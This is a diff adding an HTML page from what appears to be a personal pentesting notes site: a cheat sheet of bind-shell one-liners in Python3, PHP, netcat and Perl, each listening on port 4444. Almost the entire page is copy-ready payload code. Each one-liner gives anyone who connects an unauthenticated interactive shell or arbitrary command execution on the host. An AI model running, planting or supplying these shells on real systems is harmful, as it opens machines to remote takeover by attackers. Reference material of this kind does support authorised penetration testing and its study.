@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>ovelny - chaos/bind-shells</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta
+      name="description"
+      content="ovelny - notes on infosec, penetration testing, programming and others"
+    />
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
+    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
+    <link
+      href="/atom.xml"
+      rel="alternate"
+      title="ovelny"
+      type="application/atom+xml"
+    />
+    <script src="/assets/js/scramble-text.min.js" defer></script>
+    <script src="/assets/js/zoom-images.min.js" defer></script>
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:site" content="@ovelny"/>
+    <meta name="twitter:title" content="ovelny - chaos/bind-shells"/>
+    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
+    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
+  </head>
+  <body>
+
+    <header>
+      <section>
+        <a href="/">
+          <img
+            class="logo"
+            src="/assets/images/ovelny-pfp.png"
+            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
+          />
+        </a>
+        <h2><a class="ovelny" href="/">ovelny</a></h2>
+      </section>
+      <nav>
+        <a href="/now/">now</a>
+        <a href="/chaos/">chaos</a>
+        <a href="/phasm/">phasm</a>
+        <a href="/support/">support</a>
+        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
+        <a href="/about/">about</a>
+      </nav>
+    </header>
+    <main>
+
+    
+    <h1>Bind shells</h1>
+
+<p>All bind shell snippets are set with port <code>4444</code> on this page.</p>
+
+<h2>Python3</h2>
+
+<div class="highlight"><pre class="highlight shell"><code>python3 <span class="nt">-c</span> <span class="s1">'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",4444));s1.listen(1);c,a=s1.accept();
+while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'</span>
+</code></pre></div>
+
+<h2>PHP</h2>
+
+<div class="highlight"><pre class="highlight shell"><code>php <span class="nt">-r</span> <span class="s1">'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",4444);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'</span>
+</code></pre></div>
+
+<h2>Netcat</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="nb">rm</span> <span class="nt">-f</span> /tmp/f<span class="p">;</span> <span class="nb">mkfifo</span> /tmp/f<span class="p">;</span> <span class="nb">cat</span> /tmp/f | /bin/sh <span class="nt">-i</span> 2&gt;&amp;1 | nc <span class="nt">-l</span> 0.0.0.0 4444 <span class="o">&gt;</span> /tmp/f
+</code></pre></div>
+
+<h2>Perl</h2>
+
+<div class="highlight"><pre class="highlight shell"><code>perl <span class="nt">-e</span> <span class="s1">'use Socket;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,"&gt;&amp;C");open(STDOUT,"&gt;&amp;C");open(STDERR,"&gt;&amp;C");exec("/bin/sh -i");};'</span>
+</code></pre></div>
+
+<h2>References</h2>
+
+<ul>
+<li><a href="https://www.revshells.com/" rel="nofollow">https://www.revshells.com/</a></li>
+</ul>
+
+    
+    </main>
+    <footer id="footer">
+      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
+      <div class="footer-section">「七転び八起き」</div>
+    </footer>
+  </body>
+</html>
+
